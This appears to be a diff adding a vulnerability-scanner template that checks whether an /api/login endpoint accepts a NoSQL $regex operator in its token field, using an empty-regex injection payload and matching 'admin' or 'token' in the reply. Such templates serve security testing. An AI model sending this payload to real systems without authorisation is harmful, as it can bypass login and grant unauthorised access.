@@ -1,0 +1,19 @@
+id: nosql2-090
+name: 'NoSQL $regex in token'
+severity: high
+type: active
+tags:
+  - nosql
+  - injection
+  - api
+description: 'NoSQL operator $regex accepted on /api/login'
+requests:
+  - method: POST
+    path: '{{BaseURL}}/api/login'
+    body: '{"token":{"$regex":""},"extra":"x"}'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'admin'
+          - 'token'
